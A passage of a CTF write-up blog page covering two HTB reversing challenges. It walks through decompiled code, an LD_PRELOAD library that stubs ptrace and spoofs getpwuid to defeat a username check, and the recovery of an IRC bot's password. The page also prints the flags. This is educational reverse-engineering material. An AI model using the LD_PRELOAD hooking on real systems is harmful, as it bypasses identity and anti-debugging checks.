+</span><span>  </span><span style="color:#ffa759;">if </span><span>(ppVar1 </span><span style="color:#f29e74;">!= </span><span>(passwd </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#ffcc66;">0x0</span><span>) {
+</span><span>    ctx </span><span style="color:#f29e74;">= </span><span>(EVP_PKEY_CTX </span><span style="color:#f29e74;">*</span><span>)ppVar1</span><span style="color:#f29e74;">-&gt;</span><span>pw_name</span><span style="color:#ccc9c2cc;">;
+</span><span>    iVar3 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strcmp</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)ctx</span><span style="color:#ccc9c2cc;">,</span><span>username)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(iVar3 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>      local_28 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">while </span><span>(local_28 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x198</span><span>) {
+</span><span>        </span><span style="color:#ffa759;">if </span><span>((</span><span style="color:#f29e74;">*</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uint </span><span style="color:#f29e74;">*</span><span>)(main </span><span style="color:#f29e74;">+</span><span> local_28) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xff</span><span>) </span><span style="color:#f29e74;">==</span><span> breakpointvalue) {
+</span><span>          </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;What</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">s this now?&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>          </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        local_28 </span><span style="color:#f29e74;">=</span><span> local_28 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>      sVar4 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strlen</span><span>(encrypted_flag)</span><span style="color:#ccc9c2cc;">;
+</span><span>      outlen </span><span style="color:#f29e74;">= </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">size_t </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#f28779;">malloc</span><span>((sVar4 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>) </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffd580;">decrypt</span><span>(ctx</span><span style="color:#ccc9c2cc;">,</span><span>encrypted_flag</span><span style="color:#ccc9c2cc;">,</span><span>outlen</span><span style="color:#ccc9c2cc;">,</span><span>in</span><span style="color:#ccc9c2cc;">,</span><span>in_stack_ffffffd0)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#f29e74;">*</span><span>(undefined </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">int</span><span>)outlen </span><span style="color:#f29e74;">+ </span><span>sVar4) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#f28779;">puts</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)outlen)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffa759;">else </span><span>{
+</span><span>      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;No you are not the right person&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>    </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;?&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>  </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>So, we see a couple anti-debugging features (ptrace, etc) but those aren't super relevant.  If the current executing username matches <code>~#L-:4;f</code> then it will decrypt a stored flag and print it.  The decryption involves the username so we can't just binary patch the username check away.  This is problematic because this is not a valid linux username.  So, what can we do?</p>
+<h2 id="i-can-so-ptrace-alternative-title-how-you-can-just-overwrite-any-dynamic-library-function">i can so ptrace (alternative title: how you can just overwrite any dynamic library function)</h2>
+<p>Fun fact: on a Linux system the dynamic linker will check the environmental variable LD_PRELOAD for libraries and then bind those symbols before any other libraries.  What happens if two libraries provide the same symbol?  Well, the one which loads first!  LD_PRELOAD goes before any linked libraries which means that if you preload a shared library which exports a symbol it will override the symbol from the later loading library.  What this means is that we can just overwrite getpwuid so that it returns a struct with an arbitrary username!</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;sys/types.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdlib.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;pwd.h&gt;
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">long </span><span style="color:#ffd580;">ptrace</span><span>(</span><span style="color:#ffa759;">int </span><span style="color:#ffcc66;">request</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">pid_t </span><span style="color:#ffcc66;">pid</span><span style="color:#ccc9c2cc;">,
+</span><span>                   </span><span style="color:#ffa759;">void </span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">addr</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">void </span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">data</span><span>) {
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">struct</span><span> passwd </span><span style="color:#f29e74;">*</span><span style="color:#ffd580;">getpwuid</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">uid_t </span><span style="color:#ffcc66;">uid</span><span>) {
+</span><span>	</span><span style="color:#ffa759;">struct</span><span> passwd</span><span style="color:#f29e74;">*</span><span> ret </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffa759;">sizeof</span><span>(</span><span style="color:#ffa759;">struct</span><span> passwd))</span><span style="color:#ccc9c2cc;">;
+</span><span>	ret</span><span style="color:#f29e74;">-&gt;</span><span>pw_name </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;~#L-:4;f&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	ret</span><span style="color:#f29e74;">-&gt;</span><span>pw_passwd </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;a&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	ret</span><span style="color:#f29e74;">-&gt;</span><span>pw_uid </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>	ret</span><span style="color:#f29e74;">-&gt;</span><span>pw_gid </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">return</span><span> ret</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ gcc -m32 preload.c -shared -o preload.so
+</span><span>❯ LD_PRELOAD=$(pwd)/preload.so ./my_name_is
+</span><span>Who are you?
+</span><span>HTB{L00k1ng_f0r_4_w31rd_n4m3}
+</span></code></pre>
+<h1 id="ircware">ircware</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>During a routine check on our servers we found this suspicious binary, but when analyzing it we couldn&#39;t get it to do anything. We assume it&#39;s dead malware but maybe something interesting can still be extracted from it?
+</span></code></pre>
+<h2 id="initial-review-4">initial review</h2>
+<h3 id="entry">entry</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>undefined  [</span><span style="color:#ffcc66;">16</span><span>] </span><span style="color:#ffd580;">entry</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* rax = 0x13e, getrandom */
+</span><span>  </span><span style="color:#ffd580;">syscall</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  s_NICK_ircware_0000_00601018</span><span style="color:#f29e74;">.</span><span>_13_4_ </span><span style="color:#f29e74;">=</span><span> s_NICK_ircware_0000_00601018</span><span style="color:#f29e74;">.</span><span>_13_4_ </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0x7070707</span><span style="color:#ccc9c2cc;">;
+</span><span>  s_NICK_ircware_0000_00601018</span><span style="color:#f29e74;">.</span><span>_13_4_ </span><span style="color:#f29e74;">=</span><span> s_NICK_ircware_0000_00601018</span><span style="color:#f29e74;">.</span><span>_13_4_ </span><span style="color:#f29e74;">| </span><span style="color:#ffcc66;">0x30303030</span><span style="color:#ccc9c2cc;">;
+</span><span>  iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">connect_localhost_8000</span><span>(</span><span style="color:#ffcc66;">0x601025</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#f29e74;">&lt;</span><span> iVar1) {
+</span><span>    write_empty_line</span><span style="color:#f29e74;">?</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>    write_empty_line</span><span style="color:#f29e74;">?</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>    write_empty_line</span><span style="color:#f29e74;">?</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">do </span><span>{
+</span><span>      read</span><span style="color:#f29e74;">?</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffd580;">command_handler</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>    } </span><span style="color:#ffa759;">while</span><span>( </span><span style="color:#ffcc66;">true </span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffd580;">syscall</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">syscall</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">CONCAT88</span><span>(DAT_00601068</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x3c</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>Not a lot in the entry function.  It connects to a local server on port 8000 and then does some read/write on that socket but doesn't seem to actually write much.</p>
+<h3 id="command-handler">command_handler</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">command_handler</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>	  </span><span style="color:#f29e74;">...
+</span><span>      lVar5 </span><span style="color:#f29e74;">=</span><span> DAT_00601179</span><span style="color:#ccc9c2cc;">;
+</span><span>      pcVar9 </span><span style="color:#f29e74;">=</span><span> pcVar13</span><span style="color:#ccc9c2cc;">;
+</span><span>      pcVar11 </span><span style="color:#f29e74;">=</span><span> s_PRIVMSG_#secret_</span><span style="color:#f29e74;">:</span><span>@pass_00601161</span><span style="color:#ccc9c2cc;">;
+</span><span>	  </span><span style="color:#f29e74;">...
+</span><span>      pcVar9 </span><span style="color:#f29e74;">=</span><span> pcVar13</span><span style="color:#ccc9c2cc;">;
+</span><span>      pcVar11 </span><span style="color:#f29e74;">=</span><span> s_PRIVMSG_#secret_</span><span style="color:#f29e74;">:</span><span>@flag_00601128</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">do </span><span>{
+</span><span>        pcVar12 </span><span style="color:#f29e74;">=</span><span> pcVar11</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(lVar5 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>        lVar5 </span><span style="color:#f29e74;">=</span><span> lVar5 </span><span style="color:#f29e74;">+ -</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>        pcVar12 </span><span style="color:#f29e74;">=</span><span> pcVar11 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>        cVar1 </span><span style="color:#f29e74;">= *</span><span>pcVar9</span><span style="color:#ccc9c2cc;">;
+</span><span>        cVar2 </span><span style="color:#f29e74;">= *</span><span>pcVar11</span><span style="color:#ccc9c2cc;">;
+</span><span>        pcVar9 </span><span style="color:#f29e74;">=</span><span> pcVar9 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>        pcVar11 </span><span style="color:#f29e74;">=</span><span> pcVar12</span><span style="color:#ccc9c2cc;">;
+</span><span>      } </span><span style="color:#ffa759;">while </span><span>(cVar1 </span><span style="color:#f29e74;">==</span><span> cVar2)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(lVar5 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(_DAT_00601008 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>          </span><span style="color:#ffd580;">FUN_00400485</span><span>(pcVar12</span><span style="color:#ccc9c2cc;">,</span><span>s_Requires_password_006010c2</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>DAT_006021a9</span><span style="color:#ccc9c2cc;">,</span><span>DAT_006010d4)</span><span style="color:#ccc9c2cc;">;
+</span><span>          </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>}
+</span></code></pre>
+<p>I've stripped large parts of this function out because they weren't super useful decompilation and this contains the relevant bits.  The important things to notice here are that:</p>
+<ol>
+<li>This is IRC -- the PRIMSG #secret is a dead giveaway.  I just guessed at this point that it wanted an IRC server so I ran one and joined the #secret channel.</li>
+<li>the is a @flag command but it requires a password</li>
+<li>there is a @pass function</li>
+</ol>
+<p>The implication here is that this is an IRC bot and we need to give it the correct password before it will give us the flag.</p>
+<h2 id="so-what-s-the-password">so what's the password?</h2>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>                             LAB_00400401                                    XREF[1]:     0040043c(j)  
+</span><span>        00400401 8a 06           MOV        AL,byte ptr [RSI]=&gt;DAT_006021c0                  = ??
+</span><span>        00400403 88 03           MOV        byte ptr [RBX]=&gt;DAT_00601147,AL                  = &quot;JJ3DSCP&quot;
+</span><span>                                                                                             = 52h
+</span><span>        00400405 3c 00           CMP        AL,0x0
+</span><span>        00400407 74 35           JZ         LAB_0040043e
+</span><span>        00400409 3c 0a           CMP        AL,0xa
+</span><span>        0040040b 74 31           JZ         LAB_0040043e
+</span><span>        0040040d 3c 0d           CMP        AL,0xd
+</span><span>        0040040f 74 2d           JZ         LAB_0040043e
+</span><span>        00400411 48 3b 15        CMP        RDX,qword ptr [DAT_00601159]                     = 08h
+</span><span>                 41 0d 20 00
+</span><span>        00400418 77 4c           JA         LAB_00400466
+</span><span>        0040041a 3c 41           CMP        AL,0x41
+</span><span>        0040041c 72 0e           JC         LAB_0040042c
+</span><span>        0040041e 3c 5a           CMP        AL,0x5a
+</span><span>        00400420 77 0a           JA         LAB_0040042c
+</span><span>        00400422 04 11           ADD        AL,0x11
+</span><span>        00400424 3c 5a           CMP        AL,0x5a
+</span><span>        00400426 76 04           JBE        LAB_0040042c
+</span><span>        00400428 2c 5a           SUB        AL,0x5a
+</span><span>        0040042a 04 40           ADD        AL,0x40
+</span><span>                             LAB_0040042c                                    XREF[3]:     0040041c(j), 00400420(j), 
+</span><span>                                                                                          00400426(j)  
+</span><span>        0040042c 38 07           CMP        byte ptr [RDI]=&gt;s_RJJ3DSCP_00601150,AL           = &quot;RJJ3DSCP&quot;
+</span><span>        0040042e 75 36           JNZ        LAB_00400466
+</span><span>        00400430 48 ff c2        INC        RDX
+</span><span>        00400433 48 ff c3        INC        RBX
+</span><span>        00400436 48 ff c6        INC        RSI
+</span><span>        00400439 48 ff c7        INC        RDI
+</span><span>        0040043c eb c3           JMP        LAB_00400401
+</span><span>                             LAB_0040043e                                    XREF[3]:     00400407(j), 0040040b(j), 
+</span><span>                                                                                          0040040f(j)  
+</span><span>        0040043e 48 89 ce        MOV        RSI,RCX
+</span><span>        00400441 48 3b 15        CMP        RDX,qword ptr [DAT_00601159]                     = 08h
+</span><span>                 11 0d 20 00
+</span><span>        00400448 75 1c           JNZ        LAB_00400466
+</span><span>        0040044a 48 ff 05        INC        qword ptr [DAT_00601008]
+</span><span>                 b7 0b 20 00
+</span><span>        00400451 48 8d 35        LEA        RSI,[s_Accepted_00601092]                        = &quot;Accepted&quot;
+</span><span>                 3a 0c 20 00
+</span><span>        00400458 48 8b 0d        MOV        RCX,qword ptr [DAT_0060109b]                     = 0000000000000009h
+</span><span>                 3c 0c 20 00
+</span><span>        0040045f e8 21 00        CALL       FUN_00400485                                     undefined FUN_00400485()
+</span><span>                 00 00
+</span><span>        00400464 eb 1e           JMP        LAB_00400484
+</span><span>                             LAB_00400466                                    XREF[3]:     00400418(j), 0040042e(j), 
+</span><span>                                                                                          00400448(j)  
+</span><span>        00400466 48 c7 05        MOV        qword ptr [DAT_00601008],0x0
+</span><span>                 97 0b 20 
+</span><span>                 00 00 00 
+</span><span>        00400471 48 8d 35        LEA        RSI,[s_Rejected_006010a3]                        = &quot;Rejected&quot;
+</span><span>                 2b 0c 20 00
+</span><span>        00400478 48 8b 0d        MOV        RCX,qword ptr [DAT_006010ac]                     = 0000000000000009h
+</span><span>                 2d 0c 20 00
+</span><span>        0040047f e8 01 00        CALL       FUN_00400485                                     undefined FUN_00400485()
+</span><span>                 00 00
+</span></code></pre>
+<p>So the core flow of this segment of assembly is a fancy string comparison.  It loads the byte it is currently operating on (so 0th, 1st, 2nd, until it goes through 8 of them), mutates it based on a condition, and then compares it against <code>RJJ3DSCP</code>.  I will put these mutations in the form of a python script because that's how I solved it and I don't want to explain it with english lol.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>string </span><span style="color:#ffa759;">import </span><span>printable
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">mutate</span><span>(</span><span style="color:#ffcc66;">c</span><span>):
+</span><span>	</span><span style="color:#ffa759;">if </span><span>c </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x41</span><span>:
+</span><span>		</span><span style="color:#ffa759;">return </span><span>c
+</span><span>	</span><span style="color:#ffa759;">if </span><span>c </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">0x5a</span><span>:
+</span><span>		</span><span style="color:#ffa759;">return </span><span>c
+</span><span>	c </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">0x11
+</span><span>	</span><span style="color:#ffa759;">if </span><span>c </span><span style="color:#f29e74;">&lt;= </span><span style="color:#ffcc66;">0x5a</span><span>:
+</span><span>		</span><span style="color:#ffa759;">return </span><span>c
+</span><span>	c </span><span style="color:#f29e74;">-= </span><span style="color:#ffcc66;">0x5a
+</span><span>	c </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">0x40
+</span><span>	</span><span style="color:#ffa759;">return </span><span>c
+</span><span>
+</span><span>comp </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;RJJ3DSCP&quot;
+</span><span>
+</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>	</span><span style="color:#ffa759;">for </span><span>j </span><span style="color:#ffa759;">in </span><span>printable:
+</span><span>		</span><span style="color:#ffa759;">if </span><span style="color:#f28779;">chr</span><span>(</span><span style="color:#ffd580;">mutate</span><span>(</span><span style="color:#f28779;">ord</span><span>(j))) </span><span style="color:#f29e74;">== </span><span>comp[i]:
+</span><span>			</span><span style="color:#f28779;">print</span><span>(j</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">end</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;&#39;</span><span>)
+</span></code></pre>
+<p>That script solves for ASS3MBLY which definitely looks meaningful.  Let's try telling it to the bot!</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>* Now talking on #secret
+</span><span>* #secret :No topic is set
+</span><span>* ircware_7040 (ircware@127.0.0.1) has joined
+</span><span>&lt;sky&gt; @pass ASS3MBLY
+</span><span>&lt;ircware_7040&gt; Accepted
+</span><span>&lt;sky&gt; @flag
+</span><span>&lt;ircware_7040&gt; HTB{m1N1m411st1C_fL4g_pR0v1d3r_b0T}
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">10 December 2020</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
